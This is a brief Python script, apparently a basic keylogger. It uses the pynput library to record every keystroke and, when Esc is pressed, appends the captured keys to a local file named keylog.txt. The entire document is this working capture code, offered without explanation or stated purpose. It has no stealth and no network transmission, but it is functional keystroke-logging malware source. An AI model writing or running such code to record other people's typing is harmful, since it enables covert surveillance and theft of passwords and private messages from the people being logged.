from pynput import keyboard

pressed_keys = []

def write_to_file(keys):
    with open("keylog.txt", "a") as file:
        for key in keys:
            file.write(str(key) + "\n")

def on_press(key):
    try:
        pressed_keys.append(key.char)
    except AttributeError:
        pressed_keys.append(key)

def on_release(key):
    if key == keyboard.Key.esc:
        write_to_file(pressed_keys)
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
